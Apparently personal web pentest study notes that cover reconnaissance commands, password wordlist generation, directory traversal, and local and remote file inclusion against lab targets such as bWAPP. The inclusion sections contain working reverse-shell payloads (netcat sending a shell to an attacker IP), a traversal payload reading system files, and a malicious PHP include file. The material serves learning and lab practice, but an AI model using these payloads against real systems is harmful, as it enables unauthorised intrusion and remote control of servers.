# Web Sec

## Reconnaissance

```whois google.com```

```host google.com```

```whois -h whois.arin.net 172.217.7.206```

This scans subdomains of the host. 
`fierce -dns google.com -threads 10 -file Desktop/googleinfo.txt`


Analyze 500 search results from bing. 
`theharvester -d google.com -b bing -l 500 -f Desktop/googleinfo.html`

### Detect applications on the same service
Like 
* http://domain.com/app1
* http://domain.com/app2

### Scan ports
* `nmap` for find open ports and many other things including running scripts.
* `nmap <target> -sS` SYN scan.
* `nmap <target> -sT` tcp ports connect() target
* `sudo nmap 10.0.2.2 -sS -Pn -p 80,443` choose ports to scan
Also see `-O` and `-sV`

### Architecture information
`whatweb -a 3 <target>`

`dirbuster` and `burp` can be used to discover the available directory structure of a web app.

Always follow the minimum information principle. However if you read the source, you may find info / comments.

Search engines can used to find useful info `(site:nytimes.com -site:www.nytimes.com) AND (inurl:login OR inurl:signup)`

Google privides a list of hacking terms at [Google Hacking Database](https://www.exploit-db.com/google-hacking-database).

# Authorization and Authentication
You can use crunch to generate word lists based on password requirements. For example: `crunch 8 8 ab CD 12 ., -t @@,,%%^^`.

`cewl` is another password generator that creates dicts based on a url.
`cewl -w /root/wordlist.txt -d 1 -m 3 -e --with-numbers http://localhost/bWAPP/ba_insecure_login_3.php`

Burp can be used to brute force a login with a generated word list.

Use a passwd file
`dotdotpwn -m payload -h 192.168.204.130 -p /root/dt.txt -o unix -f /etc/passwd -d 3 -x 80 -b -k "root"`

## Local file inclusion exploit
LFI happens when an PHP page explicitly calls include function to embed another PHP page, which can be controlled by the attacker. For example, addguestbook.php below include another PHP page that can be chosen depending on the language input:
```
$lang = $_GET['LANG'];
include( $lang . '.php' );
```
Because the LANG field can be controlled, the attacker can put in the path to a local or remote file.

For example: `Windows hosts file: http://10.11.23.188/addguestbook.php?LANG=../../windows/system32/drivers/etc/hosts%00`.


An HTTP request that allows things like this is very dangerous. The `nc -e /bin/sh...` line needs to be encoded as a URL with `%20` because of spaces. However, this will allow a reverse shell.
```
GET /bWAPP/rlfi.php?language=php://input&cmd=which%20nc&action=go HTTP/1.1
....

GET /bWAPP/rlfi.php?language=php://input&cmd=/bin/nc -e /bin/sh 192.168.204.128 443&action=go HTTP/1.1
....
```

Notice this chunk of code is the dangerous bit. It redirects a shell to your ip.
```
which%20nc
/bin/nc -e /bin/sh 192.168.204.128 443
```

Your machine will listen to the incoming connection using `nc -nlvp 443`.

## Remote file inclusion
Executing a command via a remote php page: `http://10.11.23.188/addguestbook.php?LANG=http://10.11.0.105:31/evil.txt%00`

Content of /var/www/html/evil.txt:

`<?php echo shell_exec("nc.exe 10.11.0.105 4444 -e cmd.exe") ?>`

Basic idea. Kali includes some scripts to get a shell using this technique.